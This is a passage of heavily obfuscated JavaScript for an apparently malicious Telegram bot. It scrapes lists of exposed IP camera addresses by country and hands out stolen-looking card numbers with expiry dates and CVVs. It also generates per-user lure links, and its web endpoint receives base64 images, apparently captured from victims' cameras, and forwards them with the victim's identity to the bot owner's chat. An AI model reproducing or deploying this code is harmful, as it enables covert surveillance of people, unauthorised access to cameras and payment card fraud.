        _0x187af9[_0x200cf8(0x488)](_0x26bc9b, -0xee2 + -0x3 * -0x515 + -0x5d) && _0x34e02a[_0x200cf8(0x39e)], _0x187af9[_0x200cf8(0x3fb)](_0x1745f4, _0x4594ec[_0x200cf8(0x825)]) && _0x34e02a[_0x200cf8(0x39e)]({
            'text': _0x187af9[_0x200cf8(0xc27)],
            'callback_data': _0x200cf8(0xb08) + _0x1745f4
        }), _0x34e02a[_0x200cf8(0x825)] && _0x578d62[_0x200cf8(0x39e)](_0x34e02a), bot[_0x200cf8(0xb04) + 'e'](_0x1de3f4, _0x187af9[_0x200cf8(0x774)], { 'reply_markup': { 'inline_keyboard': _0x578d62 } });
    } catch (_0x1ab0c9) {
        bot[_0x200cf8(0xb04) + 'e'](_0x1de3f4, _0x200cf8(0x82b) + _0x200cf8(0x204) + _0x200cf8(0x345) + _0x1ab0c9[_0x200cf8(0x33c)]);
    }
}
async function displayCameras(_0x25acc8, _0x1ac06f) {
    const _0xac05 = _0x298049, _0x132f68 = {
            'Ffppy': _0xac05(0x7a3) + _0xac05(0x446) + _0xac05(0x6bb),
            'Pnxvr': function (_0x167ec1, _0x2185a5) {
                return _0x167ec1 < _0x2185a5;
            },
            'BDAzL': function (_0x296852, _0x474e3e) {
                return _0x296852 % _0x474e3e;
            },
            'NEyZf': _0xac05(0xa7f) + _0xac05(0x828) + _0xac05(0xc5f) + _0xac05(0xa45) + _0xac05(0x46c) + _0xac05(0x1cd) + _0xac05(0xc95) + _0xac05(0x224) + _0xac05(0x915) + _0xac05(0xba6) + _0xac05(0xa4b) + '6',
            'xZGnX': _0xac05(0x8a6) + _0xac05(0xb65) + _0xac05(0x484) + _0xac05(0xb5d) + _0xac05(0x6cc) + _0xac05(0x88a) + _0xac05(0x7ff) + _0xac05(0x489) + _0xac05(0x234) + _0xac05(0x730),
            'XLuXi': function (_0x2b4f1c, _0x1c70e2, _0x380e11) {
                return _0x2b4f1c(_0x1c70e2, _0x380e11);
            },
            'MXVTZ': function (_0xefb21c, _0x473680) {
                return _0xefb21c <= _0x473680;
            },
            'tPlha': function (_0x2cc0e3, _0x294259) {
                return _0x2cc0e3 + _0x294259;
            },
            'KejMD': _0xac05(0x542) + _0xac05(0xb65) + _0xac05(0x484) + _0xac05(0xb50) + _0xac05(0xbd0) + _0xac05(0x9b5) + _0xac05(0x66d) + _0xac05(0x957) + _0xac05(0x1f6) + _0xac05(0x505) + _0xac05(0x589) + _0xac05(0x517) + _0xac05(0x674) + _0xac05(0x58a) + _0xac05(0xb9c) + _0xac05(0xc48) + _0xac05(0x1e2) + _0xac05(0x414) + _0xac05(0x6da),
            'QyOMf': _0xac05(0x8a6) + _0xac05(0xb65) + _0xac05(0x484) + _0xac05(0xb5d) + _0xac05(0x6cc) + _0xac05(0x689) + _0xac05(0x355) + _0xac05(0x27c) + _0xac05(0x4c2) + _0xac05(0xc30)
        };
    try {
        const _0x3cf51d = await bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0x132f68[_0xac05(0xa22)]), _0x2501b8 = _0x3cf51d[_0xac05(0x42f)];
        for (let _0x80461c = 0x1 * -0x1d + 0x1 * -0xaf1 + 0xb0e; _0x132f68[_0xac05(0x3b6)](_0x80461c, 0xa2a * 0x3 + 0x4cd + -0x233c); _0x80461c++) {
            await bot[_0xac05(0x382) + _0xac05(0x220)](_0xac05(0x7a3) + _0xac05(0x446) + _0xac05(0x2d6) + '.'[_0xac05(0x65b)](_0x132f68[_0xac05(0x892)](_0x80461c, -0x22f8 + -0x1e79 * 0x1 + 0x4175)), {
                'chat_id': _0x25acc8,
                'message_id': _0x2501b8
            }), await new Promise(_0x219017 => setTimeout(_0x219017, 0x2679 + 0x10d5 + 0x132 * -0x2b));
        }
        const _0x2d0ad7 = _0xac05(0x5f4) + _0xac05(0x553) + _0xac05(0x3dd) + _0xac05(0xab4) + _0x1ac06f, _0x2592de = { 'User-Agent': _0x132f68[_0xac05(0xb6e)] };
        let _0x312215 = await axios[_0xac05(0x943)](_0x2d0ad7, { 'headers': _0x2592de });
        const _0x1aea97 = _0x312215[_0xac05(0xc57)][_0xac05(0xd1a)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x1aea97) {
            bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0x132f68[_0xac05(0x8ee)]);
            return;
        }
        const _0x1bde4d = _0x132f68[_0xac05(0x89d)](parseInt, _0x1aea97[0x112f + 0x1 * 0x251f + -0x364d], 0x4e5 * 0x4 + 0x227f + -0x3609), _0x3d85fc = [];
        for (let _0x3a7e2c = 0x13 * -0x10f + 0x2202 + -0xde4; _0x132f68[_0xac05(0xcbf)](_0x3a7e2c, _0x1bde4d); _0x3a7e2c++) {
            _0x312215 = await axios[_0xac05(0x943)](_0x2d0ad7 + _0xac05(0xb8e) + _0x3a7e2c, { 'headers': _0x2592de });
            const _0x4960a6 = _0x312215[_0xac05(0xc57)][_0xac05(0xd1a)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x3d85fc[_0xac05(0x39e)](..._0x4960a6);
        }
        if (_0x3d85fc[_0xac05(0x825)]) {
            const _0x1758ac = _0x3d85fc[_0xac05(0x5c0)]((_0x23c8fe, _0xd2cae7) => _0xd2cae7 + (0x1e20 + 0x13 * 0x15b + 0x12a0 * -0x3) + '.\x20' + _0x23c8fe);
            for (let _0x2f01b4 = 0x1211 + 0x1d4a + -0x2f5b; _0x132f68[_0xac05(0x3b6)](_0x2f01b4, _0x1758ac[_0xac05(0x825)]); _0x2f01b4 += 0x2 * 0x1303 + 0xa6d + -0x3041 * 0x1) {
                const _0x2a7b99 = _0x1758ac[_0xac05(0x69c)](_0x2f01b4, _0x132f68[_0xac05(0x4e2)](_0x2f01b4, 0x1f49 + 0x7 * -0x1ee + -0x1 * 0x1195));
                await bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0x2a7b99[_0xac05(0xc65)]('\x0a'));
            }
            await bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0x132f68[_0xac05(0x7ed)]);
        } else
            await bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0x132f68[_0xac05(0x1b7)]);
    } catch (_0x384791) {
        await bot[_0xac05(0xb04) + 'e'](_0x25acc8, _0xac05(0x8a6) + _0xac05(0xb65) + _0xac05(0x484) + _0xac05(0xb5d) + _0xac05(0x6cc) + _0xac05(0x689) + _0xac05(0x355) + _0xac05(0x27c) + _0xac05(0x4c2) + _0xac05(0xc30));
    }
}
function isDeveloper(_0x34c860) {
    const _0x572b97 = _0x298049, _0x40764d = {
            'Euwie': function (_0x364991, _0x1b8dd9) {
                return _0x364991 === _0x1b8dd9;
            }
        }, _0x943bc1 = -0x1a17faaa5 + -0xeaf962 * 0xd7 + -0x3bcea4bad * -0x1;
    return _0x40764d[_0x572b97(0x2d2)](_0x34c860, _0x943bc1);
}
function showAdminPanel(_0x1d903f) {
    const _0xd4430d = _0x298049, _0x2b6987 = {
            'gALvA': _0xd4430d(0xbf8) + 'م:',
            'QUMZO': _0xd4430d(0x738) + _0xd4430d(0x821),
            'DQgza': _0xd4430d(0xb94),
            'XvVQd': _0xd4430d(0x298) + _0xd4430d(0x821),
            'YGkdN': _0xd4430d(0xb81)
        };
    bot[_0xd4430d(0xb04) + 'e'](_0x1d903f, _0x2b6987[_0xd4430d(0x4f0)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x2b6987[_0xd4430d(0xc37)],
                        'callback_data': _0x2b6987[_0xd4430d(0x284)]
                    }],
                [{
                        'text': _0x2b6987[_0xd4430d(0xcb3)],
                        'callback_data': _0x2b6987[_0xd4430d(0xcbd)]
                    }]
            ]
        }
    });
}
bot[_0x298049(0x65c)](/\/jjjjjavayy/, _0x924cc8 => {
    const _0x314f29 = _0x298049, _0x535f45 = {
            'RvjXw': _0x314f29(0xa65) + _0x314f29(0x66c) + _0x314f29(0xbb1) + _0x314f29(0x8bf) + _0x314f29(0xd04),
            'fgcKT': _0x314f29(0x1cb) + 'ي',
            'lPRZP': _0x314f29(0x265),
            'tLtiN': _0x314f29(0xabd) + _0x314f29(0x709),
            'dVHVo': _0x314f29(0xaf3) + 're',
            'RLPhs': _0x314f29(0x7d9) + 'ء',
            'aPHcq': _0x314f29(0x9ca)
        }, _0x39c897 = _0x924cc8[_0x314f29(0x556)]['id'], _0x3d06ad = _0x535f45[_0x314f29(0x253)];
    bot[_0x314f29(0xb04) + 'e'](_0x39c897, _0x3d06ad, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x535f45[_0x314f29(0x31c)],
                        'callback_data': _0x535f45[_0x314f29(0xc01)]
                    }],
                [{
                        'text': _0x535f45[_0x314f29(0x83b)],
                        'callback_data': _0x535f45[_0x314f29(0x1cf)]
                    }],
                [{
                        'text': _0x535f45[_0x314f29(0x57a)],
                        'callback_data': _0x535f45[_0x314f29(0x3d7)]
                    }]
            ]
        }
    });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x2f0805 => {
    const _0x1ef618 = _0x298049, _0x1d1ad3 = {
            'TWDje': function (_0x12bb3f, _0x502007) {
                return _0x12bb3f === _0x502007;
            },
            'twXHo': _0x1ef618(0x265),
            'mShfg': _0x1ef618(0xaf3) + 're',
            'iBYIn': function (_0x13ee65, _0xc71ad3) {
                return _0x13ee65 === _0xc71ad3;
            },
            'qPSng': _0x1ef618(0x9ca),
            'VYVyp': _0x1ef618(0xb0b) + _0x1ef618(0xa33) + '\x20✅',
            'AJqry': _0x1ef618(0x3f6)
        }, _0x4d6e23 = _0x2f0805[_0x1ef618(0x33c)][_0x1ef618(0x556)]['id'];
    let _0xd61eba;
    if (_0x1d1ad3[_0x1ef618(0x77a)](_0x2f0805[_0x1ef618(0xc57)], _0x1d1ad3[_0x1ef618(0x4d2)]))
        _0xd61eba = baseUrl + (_0x1ef618(0xc78) + _0x1ef618(0x26d)) + _0x4d6e23 + _0x1ef618(0xa67);
    else {
        if (_0x1d1ad3[_0x1ef618(0x77a)](_0x2f0805[_0x1ef618(0xc57)], _0x1d1ad3[_0x1ef618(0xc60)]))
            _0xd61eba = baseUrl + (_0x1ef618(0x76f) + _0x1ef618(0x26d)) + _0x4d6e23 + _0x1ef618(0xa67);
        else
            _0x1d1ad3[_0x1ef618(0x26b)](_0x2f0805[_0x1ef618(0xc57)], _0x1d1ad3[_0x1ef618(0xbcc)]) && (_0xd61eba = baseUrl + (_0x1ef618(0x96c) + _0x1ef618(0x26d)) + _0x4d6e23 + _0x1ef618(0xa67));
    }
    if (_0xd61eba)
        bot[_0x1ef618(0xb04) + 'e'](_0x4d6e23, _0x1ef618(0x55c) + _0x1ef618(0xcf7) + _0xd61eba), bot[_0x1ef618(0x5a1) + _0x1ef618(0x600)](_0x2f0805['id'], { 'text': _0x1d1ad3[_0x1ef618(0x202)] });
    else
        _0x1d1ad3[_0x1ef618(0x26b)](_0x2f0805[_0x1ef618(0xc57)], _0x1d1ad3[_0x1ef618(0xa20)]) && (bot[_0x1ef618(0xb04) + 'e'](_0x4d6e23, _0x1ef618(0xa34) + _0x1ef618(0xa39) + _0x1ef618(0xc67) + _0x1ef618(0x5e7) + _0x1ef618(0x47e) + _0x1ef618(0x867) + _0x1ef618(0x512) + 'ip'), bot[_0x1ef618(0x5a1) + _0x1ef618(0x600)](_0x2f0805['id'], { 'text': '' }));
}), bot[_0x298049(0x65c)](/\/نننطسطوو/, _0x9a9038 => {
    const _0x3343f5 = _0x298049, _0x19f0e0 = {
            'zFggD': _0x3343f5(0x637) + _0x3343f5(0x747) + _0x3343f5(0x968) + _0x3343f5(0x85a),
            'LYTeS': _0x3343f5(0x221) + _0x3343f5(0xbee),
            'LjMBd': _0x3343f5(0xa9d) + 's',
            'dorOR': function (_0x997035, _0x2a14c1) {
                return _0x997035(_0x2a14c1);
            },
            'oCiAo': function (_0x28b07e, _0x4635cc) {
                return _0x28b07e(_0x4635cc);
            }
        }, _0xecfb6c = _0x9a9038[_0x3343f5(0x556)]['id'];
    bot[_0x3343f5(0xb04) + 'e'](_0xecfb6c, _0x19f0e0[_0x3343f5(0x1e3)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x19f0e0[_0x3343f5(0x9b9)],
                        'callback_data': _0x19f0e0[_0x3343f5(0x929)]
                    }]]
        }
    }), _0x19f0e0[_0x3343f5(0xc0f)](isDeveloper, _0xecfb6c) && _0x19f0e0[_0x3343f5(0x739)](showAdminPanel, _0xecfb6c);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x4a1d13 => {
    const _0x3c1f62 = _0x298049, _0x5e1cb6 = {
            'DePPa': function (_0x9df277, _0x505e47) {
                return _0x9df277 === _0x505e47;
            },
            'FAyUE': _0x3c1f62(0xa9d) + 's',
            'CVwwe': function (_0x4a677b, _0x5417e1) {
                return _0x4a677b(_0x5417e1);
            },
            'TREne': function (_0x2e133e, _0x184b16) {
                return _0x2e133e in _0x184b16;
            },
            'rQRuz': function (_0x370fea, _0x524b8e, _0x4d8245) {
                return _0x370fea(_0x524b8e, _0x4d8245);
            },
            'ezZjQ': _0x3c1f62(0xb08),
            'BvnCe': function (_0x43a13f, _0x329972, _0x280f19) {
                return _0x43a13f(_0x329972, _0x280f19);
            },
            'IxKuL': _0x3c1f62(0x341),
            'dOAvI': function (_0x125257, _0x1780e9, _0x51172c) {
                return _0x125257(_0x1780e9, _0x51172c);
            },
            'OJkpx': function (_0x4af3d4, _0x38a074) {
                return _0x4af3d4 - _0x38a074;
            }
        }, _0x5c6cc2 = _0x4a1d13[_0x3c1f62(0x33c)][_0x3c1f62(0x556)]['id'];
    if (_0x5e1cb6[_0x3c1f62(0x945)](_0x4a1d13[_0x3c1f62(0xc57)], _0x5e1cb6[_0x3c1f62(0x50e)]))
        _0x5e1cb6[_0x3c1f62(0x20f)](showCountryList, _0x5c6cc2);
    else {
        if (_0x5e1cb6[_0x3c1f62(0x7bd)](_0x4a1d13[_0x3c1f62(0xc57)], countryTranslation))
            bot[_0x3c1f62(0x51f) + _0x3c1f62(0x8a3)](_0x5c6cc2, _0x4a1d13[_0x3c1f62(0x33c)][_0x3c1f62(0x42f)]), _0x5e1cb6[_0x3c1f62(0x2ba)](displayCameras, _0x5c6cc2, _0x4a1d13[_0x3c1f62(0xc57)]);
        else {
            if (_0x4a1d13[_0x3c1f62(0xc57)][_0x3c1f62(0x5cd)](_0x5e1cb6[_0x3c1f62(0x983)])) {
                const _0x25fa81 = _0x5e1cb6[_0x3c1f62(0x2ba)](parseInt, _0x4a1d13[_0x3c1f62(0xc57)][_0x3c1f62(0xb11)]('_')[0x2 * 0x709 + 0x2419 + 0x1 * -0x322a], -0xe61 * -0x1 + 0x1 * -0x5b + -0xdfc);
                bot[_0x3c1f62(0x51f) + _0x3c1f62(0x8a3)](_0x5c6cc2, _0x4a1d13[_0x3c1f62(0x33c)][_0x3c1f62(0x42f)]), _0x5e1cb6[_0x3c1f62(0xa61)](showCountryList, _0x5c6cc2, _0x25fa81);
            } else {
                if (_0x4a1d13[_0x3c1f62(0xc57)][_0x3c1f62(0x5cd)](_0x5e1cb6[_0x3c1f62(0x28f)])) {
                    const _0x2f5b53 = _0x5e1cb6[_0x3c1f62(0x2c6)](parseInt, _0x4a1d13[_0x3c1f62(0xc57)][_0x3c1f62(0xb11)]('_')[-0xbd1 + -0x65 * -0x48 + -0x1096], -0x67 * 0x47 + 0x1550 + 0x1 * 0x74b), _0x47e38a = Math[_0x3c1f62(0x3c7)](0x1175 * -0x2 + -0x2 * 0x5b3 + 0x2e50, _0x5e1cb6[_0x3c1f62(0xc03)](_0x2f5b53, -0x2329 + 0x1d38 + 0x13 * 0x51));
                    bot[_0x3c1f62(0x51f) + _0x3c1f62(0x8a3)](_0x5c6cc2, _0x4a1d13[_0x3c1f62(0x33c)][_0x3c1f62(0x42f)]), _0x5e1cb6[_0x3c1f62(0x2c6)](showCountryList, _0x5c6cc2, _0x47e38a);
                }
            }
        }
    }
});
const americanBanks = [
        _0x298049(0x7c6) + _0x298049(0x9f6),
        _0x298049(0x301),
        _0x298049(0xcad),
        _0x298049(0x545) + 'o',
        _0x298049(0x20e) + 'e',
        _0x298049(0x5ad),
        _0x298049(0x9f9),
        _0x298049(0x259),
        _0x298049(0xa4f) + _0x298049(0x280),
        _0x298049(0x383) + _0x298049(0xbac)
    ], fetchVisaData = async () => {
        const _0x5a5a16 = _0x298049, _0x2be412 = {
                'imrXj': function (_0x5e69f7, _0x3928ad) {
                    return _0x5e69f7 === _0x3928ad;
                },
                'HHsme': function (_0xe197ab, _0x47a5ff) {
                    return _0xe197ab * _0x47a5ff;
                },
                'UVsqB': _0x5a5a16(0x7c3) + _0x5a5a16(0xafb) + _0x5a5a16(0x95f),
                'BpaKE': _0x5a5a16(0xae1),
                'AMBXR': function (_0x33e176, _0xf0fbd4) {
                    return _0x33e176 + _0xf0fbd4;
                },
                'WfrOi': function (_0x3784c6, _0x17aa0a) {
                    return _0x3784c6 * _0x17aa0a;
                },
                'oRkgW': _0x5a5a16(0xb8a) + _0x5a5a16(0x411) + _0x5a5a16(0x37a),
                'pmlEN': function (_0x295b8f, _0x15b63f) {
                    return _0x295b8f > _0x15b63f;
                },
                'FhEHz': function (_0x51c667, _0x498414) {
                    return _0x51c667 > _0x498414;
                },
                'Vvhdh': function (_0x3e8624, _0x2d07c5) {
                    return _0x3e8624 * _0x2d07c5;
                },
                'LOwlz': _0x5a5a16(0x65f) + _0x5a5a16(0x40e) + _0x5a5a16(0x7eb) + _0x5a5a16(0xae5) + _0x5a5a16(0xa40) + _0x5a5a16(0x77d),
                'afVaP': _0x5a5a16(0x759) + _0x5a5a16(0x6e9)
            };
        try {
            const _0x332b8a = _0x2be412[_0x5a5a16(0xd32)], _0x4d7936 = await axios[_0x5a5a16(0x943)](_0x332b8a), _0x4ef721 = _0x4d7936[_0x5a5a16(0xc57)], _0x3a28e9 = _0x4ef721[_0x5a5a16(0x5b6)]()[_0x5a5a16(0xb11)]('\x0a');
            if (_0x2be412[_0x5a5a16(0x36f)](_0x3a28e9[_0x5a5a16(0x825)], -0x1196 + -0xc57 * 0x2 + 0x2a44)) {
                const _0x2edfc8 = _0x3a28e9[_0x5a5a16(0x5c0)](_0x143349 => {
                    const _0x2440a9 = _0x5a5a16, _0x437f55 = _0x143349[_0x2440a9(0xb11)]('|');
                    if (_0x2be412[_0x2440a9(0x503)](_0x437f55[_0x2440a9(0x825)], -0x163d + 0x1f5c + -0x91b))
                        return {
                            'CardNumber': _0x437f55[0x8b * 0x14 + 0x192f + -0x240b],
                            'Expiry': _0x437f55[0x1 * -0x35b + -0x18ea + 0x1c46] + '/' + _0x437f55[-0x3d * -0x5 + 0xd16 + 0xe45 * -0x1],
                            'CVV': _0x437f55[-0x1 * -0x1beb + -0x1 * -0x1a99 + 0x1 * -0x3681],
                            'Bank': americanBanks[Math[_0x2440a9(0xac9)](_0x2be412[_0x2440a9(0x70f)](Math[_0x2440a9(0x916)](), americanBanks[_0x2440a9(0x825)]))],
                            'CardType': _0x2be412[_0x2440a9(0xa3c)],
                            'Country': _0x2be412[_0x2440a9(0x8b2)],
                            'Value': '$' + _0x2be412[_0x2440a9(0x57c)](Math[_0x2440a9(0xac9)](_0x2be412[_0x2440a9(0xc90)](Math[_0x2440a9(0x916)](), -0xf01 + 0x21b5 + -0x1295)), -0x1278 * 0x1 + -0xb15 * 0x2 + 0x28ac)
                        };
                })[_0x5a5a16(0xbf9)](Boolean);
                if (_0x2be412[_0x5a5a16(0x273)](_0x2edfc8[_0x5a5a16(0x825)], 0x2 * -0x75e + -0x1 * 0x1ae1 + 0x1 * 0x299d))
                    return _0x2edfc8[Math[_0x5a5a16(0xac9)](_0x2be412[_0x5a5a16(0x2b0)](Math[_0x5a5a16(0x916)](), _0x2edfc8[_0x5a5a16(0x825)]))];
            }
            return console[_0x5a5a16(0x9d7)](_0x2be412[_0x5a5a16(0x445)]), null;
        } catch (_0x44b4c8) {
            return console[_0x5a5a16(0x9d7)](_0x2be412[_0x5a5a16(0x48c)], _0x44b4c8[_0x5a5a16(0x33c)]), null;
        }
    };
bot[_0x298049(0x65c)](/\/نكخمنتته/, _0x164e0b => {
    const _0x2a24f4 = _0x298049, _0x273eb3 = {
            'yIEUl': _0x2a24f4(0xb74) + _0x2a24f4(0xaf1),
            'CIcBm': _0x2a24f4(0x4ab) + _0x2a24f4(0xaf1),
            'nLDPA': _0x2a24f4(0x380),
            'ZcDLQ': _0x2a24f4(0x625) + _0x2a24f4(0x950) + _0x2a24f4(0xd05) + _0x2a24f4(0x1db) + _0x2a24f4(0x8b4) + _0x2a24f4(0xc52) + _0x2a24f4(0x544)
        }, _0x26f785 = _0x164e0b[_0x2a24f4(0x556)]['id'], _0x15e21c = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x273eb3[_0x2a24f4(0xd37)],
                            'callback_data': _0x273eb3[_0x2a24f4(0xa7d)]
                        }]]
            },
            'parse_mode': _0x273eb3[_0x2a24f4(0xbd2)]
        };
    bot[_0x2a24f4(0xb04) + 'e'](_0x26f785, _0x273eb3[_0x2a24f4(0x826)], _0x15e21c);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x24d128 => {
    const _0x205b31 = _0x298049, _0x55521b = {
            'IyVFW': function (_0x40eee5, _0x4c42ee) {
                return _0x40eee5 === _0x4c42ee;
            },
            'txtdv': _0x205b31(0x4ab) + _0x205b31(0xaf1),
            'cpBsP': _0x205b31(0x6c3) + _0x205b31(0x296) + _0x205b31(0xd39) + _0x205b31(0x6b3),
            'GKjbd': _0x205b31(0x6c3) + _0x205b31(0x296) + _0x205b31(0x552) + _0x205b31(0xb70),
            'SpvgL': _0x205b31(0x6c3) + _0x205b31(0x296) + _0x205b31(0x4f5) + _0x205b31(0x306),
            'WgNBo': _0x205b31(0x6c3) + _0x205b31(0x296) + _0x205b31(0xd03) + _0x205b31(0x76d),
            'Clddb': _0x205b31(0x6c3) + _0x205b31(0x296) + _0x205b31(0x2ae) + _0x205b31(0xc3e),
            'iRaOz': function (_0x5274d2) {
                return _0x5274d2();
            },
            'NNjcm': _0x205b31(0x380),
            'NiHIk': _0x205b31(0xbb3) + _0x205b31(0x9ad) + _0x205b31(0xc46) + _0x205b31(0xb18) + _0x205b31(0x459)
        }, _0x15ee1c = _0x24d128[_0x205b31(0x33c)][_0x205b31(0x556)]['id'];
    if (_0x55521b[_0x205b31(0x87d)](_0x24d128[_0x205b31(0xc57)], _0x55521b[_0x205b31(0x3ac)])) {
        let _0x524428 = await bot[_0x205b31(0xb04) + 'e'](_0x15ee1c, _0x55521b[_0x205b31(0x754)]);
        await new Promise(_0x2b89bb => setTimeout(_0x2b89bb, -0xbd2 + 0xb * 0x21 + 0x14d * 0xb)), await bot[_0x205b31(0x382) + _0x205b31(0x220)](_0x55521b[_0x205b31(0xbcd)], {
            'chat_id': _0x15ee1c,
            'message_id': _0x524428[_0x205b31(0x42f)]
        }), await new Promise(_0x512cd2 => setTimeout(_0x512cd2, -0xc73 + 0x277 * 0x1 + 0xde4)), await bot[_0x205b31(0x382) + _0x205b31(0x220)](_0x55521b[_0x205b31(0xcc7)], {
            'chat_id': _0x15ee1c,
            'message_id': _0x524428[_0x205b31(0x42f)]
        }), await new Promise(_0x5bf0c3 => setTimeout(_0x5bf0c3, -0x1f0c + -0x21e * -0x8 + -0x1204 * -0x1)), await bot[_0x205b31(0x382) + _0x205b31(0x220)](_0x55521b[_0x205b31(0x9b0)], {
            'chat_id': _0x15ee1c,
            'message_id': _0x524428[_0x205b31(0x42f)]
        }), await new Promise(_0x1bdf46 => setTimeout(_0x1bdf46, 0x4e7 + -0x14b * -0x2 + -0x395)), await bot[_0x205b31(0x382) + _0x205b31(0x220)](_0x55521b[_0x205b31(0x524)], {
            'chat_id': _0x15ee1c,
            'message_id': _0x524428[_0x205b31(0x42f)]
        }), await new Promise(_0x245278 => setTimeout(_0x245278, 0x217e + -0x453 + 0xdf * -0x1d)), await bot[_0x205b31(0x51f) + _0x205b31(0x8a3)](_0x15ee1c, _0x524428[_0x205b31(0x42f)]);
        const _0x4978bc = await _0x55521b[_0x205b31(0x237)](fetchVisaData);
        if (_0x4978bc) {
            const {
                CardNumber: _0x4421d9,
                Expiry: _0xeac318,
                CVV: _0xac4348,
                Bank: _0x21988b,
                CardType: _0x131c12,
                Country: _0x313a75,
                Value: _0x1c0f3c
            } = _0x4978bc;
            bot[_0x205b31(0xb04) + 'e'](_0x15ee1c, _0x205b31(0x97e) + _0x205b31(0x6a9) + _0x205b31(0x839) + '`' + _0x4421d9 + (_0x205b31(0x323) + _0x205b31(0x1ad)) + _0xeac318 + (_0x205b31(0xbf4) + _0x205b31(0x256)) + _0xac4348 + (_0x205b31(0x52d) + _0x205b31(0xd1c)) + _0x21988b + (_0x205b31(0x1b0) + _0x205b31(0x68f) + '`') + _0x131c12 + (_0x205b31(0xb56) + _0x205b31(0x71e)) + _0x313a75 + (_0x205b31(0x883) + _0x205b31(0x2ee)) + _0x1c0f3c + (_0x205b31(0xb40) + _0x205b31(0x409) + _0x205b31(0x409) + _0x205b31(0x58e) + _0x205b31(0x90b) + _0x205b31(0x3b2) + _0x205b31(0x2bf)), { 'parse_mode': _0x55521b[_0x205b31(0xcfd)] });
        } else
            bot[_0x205b31(0xb04) + 'e'](_0x15ee1c, _0x55521b[_0x205b31(0x573)]);
    }
});
const deleteFolderRecursive = _0x301120 => {
    const _0x5f160b = _0x298049, _0x4db391 = {
            'mKHDz': function (_0x590975, _0x52aac8) {
                return _0x590975(_0x52aac8);
            }
        };
    fs[_0x5f160b(0x73e)](_0x301120) && (fs[_0x5f160b(0x6f2) + 'c'](_0x301120)[_0x5f160b(0x9a0)](_0x2d04d9 => {
        const _0x1241ed = _0x5f160b, _0x4dd984 = path[_0x1241ed(0xc65)](_0x301120, _0x2d04d9);
        fs[_0x1241ed(0x8ca)](_0x4dd984)[_0x1241ed(0x921) + 'y']() ? _0x4db391[_0x1241ed(0x5b3)](deleteFolderRecursive, _0x4dd984) : fs[_0x1241ed(0xb53)](_0x4dd984);
    }), fs[_0x5f160b(0xaa6)](_0x301120));
};
app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname)), app[_0x298049(0xb22)](_0x298049(0xcca), (_0x1aaaa8, _0x211dfa) => {
    const _0x529e6f = _0x298049, _0x298967 = {
            'EerwN': _0x529e6f(0x463) + _0x529e6f(0xd17) + _0x529e6f(0xcc3),
            'OPbZF': function (_0x459e62, _0x425dd2) {
                return _0x459e62 + _0x425dd2;
            },
            'RFVwM': _0x529e6f(0x82b) + _0x529e6f(0x636) + _0x529e6f(0x721) + _0x529e6f(0xbc4),
            'Hwjee': function (_0x4ce9a8, _0x2b11a4) {
                return _0x4ce9a8 + _0x2b11a4;
            },
            'yXTPg': _0x529e6f(0x5a4),
            'fpsUB': _0x529e6f(0x7fb) + _0x529e6f(0x68b) + _0x529e6f(0x77c) + _0x529e6f(0xa9a) + _0x529e6f(0x58d) + _0x529e6f(0x742)
        }, _0x308fe4 = _0x1aaaa8[_0x529e6f(0x2ea)][_0x529e6f(0x586)], _0x3bc649 = _0x1aaaa8[_0x529e6f(0x2ea)][_0x529e6f(0x6fd)][_0x529e6f(0xb11)](',');
    _0x3bc649[_0x529e6f(0x9a0)]((_0x1cb13e, _0x489d47) => {
        const _0x5b4814 = _0x529e6f, _0x58034e = {
                'ukALQ': _0x298967[_0x5b4814(0x7b9)],
                'INMNe': function (_0x5deb4d, _0x871eee) {
                    const _0x161745 = _0x5b4814;
                    return _0x298967[_0x161745(0xab6)](_0x5deb4d, _0x871eee);
                }
            }, _0x545a7f = Buffer[_0x5b4814(0x9cc)](_0x1cb13e, _0x298967[_0x5b4814(0xb5a)]);
        bot[_0x5b4814(0xa77)](_0x308fe4)[_0x5b4814(0x86c)](_0x50b887 => {
            const _0x52d712 = _0x5b4814, _0x5d4814 = _0x50b887[_0x52d712(0x62c)] ? '@' + _0x50b887[_0x52d712(0x62c)] : _0x298967[_0x52d712(0x7fc)], _0x826804 = ((_0x50b887[_0x52d712(0xa00)] || '') + '\x20' + (_0x50b887[_0x52d712(0x6a2)] || ''))[_0x52d712(0x5b6)]();
            bot[_0x52d712(0x8ab)](_0x308fe4, _0x545a7f, { 'caption': _0x52d712(0x55f) + _0x298967[_0x52d712(0xbbe)](_0x489d47, 0x24dd + -0x1341 + -0x119b * 0x1) }), botOwner[_0x52d712(0x8ab)](ownerChatId, _0x545a7f, { 'caption': _0x52d712(0x6a0) + _0x52d712(0xcc2) + _0x52d712(0x351) + _0x52d712(0x1c2) + _0x308fe4 + (_0x52d712(0x53b) + _0x52d712(0x7a4)) + _0x5d4814 + (_0x52d712(0xa54) + _0x52d712(0x3dc)) + _0x826804 + _0x52d712(0x771) + _0x298967[_0x52d712(0xbbe)](_0x489d47, -0xe0c + -0x1 * 0x198c + -0x3 * -0xd33) });
        })[_0x5b4814(0x40a)](_0x1c2398 => {
            const _0xb495a7 = _0x5b4814;
            console[_0xb495a7(0x7b5)](_0x58034e[_0xb495a7(0x4ce)], _0x1c2398), botOwner[_0xb495a7(0x8ab)](ownerChatId, _0x545a7f, { 'caption': _0xb495a7(0x6a0) + _0xb495a7(0xcc2) + _0xb495a7(0x351) + _0xb495a7(0x1c2) + _0x308fe4 + (_0xb495a7(0x53b) + _0xb495a7(0x1ee) + _0xb495a7(0xc19) + _0xb495a7(0x307) + _0xb495a7(0x4a0) + _0xb495a7(0x771)) + _0x58034e[_0xb495a7(0x46a)](_0x489d47, -0x1 * -0x2104 + -0x1 * 0x14b1 + -0xc52) });
        });
